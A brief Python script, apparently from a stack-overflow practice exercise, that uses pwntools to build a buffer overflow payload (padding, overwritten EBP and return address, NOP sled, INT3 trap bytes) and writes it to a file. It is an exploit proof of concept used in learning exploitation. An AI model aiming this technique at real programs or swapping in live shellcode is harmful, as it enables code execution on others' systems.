# import struct
# padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
# ebp = "TTTT"
# eip = struct.pack("I", 0xffffcd20+150)
# shellcode = "\x90" * 150 + "\xCC" * 4
# payload = padding + ebp + eip + shellcode
# print payload

from pwn import *
padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = b"TTTT"
eip = p32(0xffffcd20+150)
shellcode = b"\x90" * 150 + b"\xCC" * 4
payload = padding + ebp + eip + shellcode
with open('payload_trap', 'wb') as f:
    f.write(payload)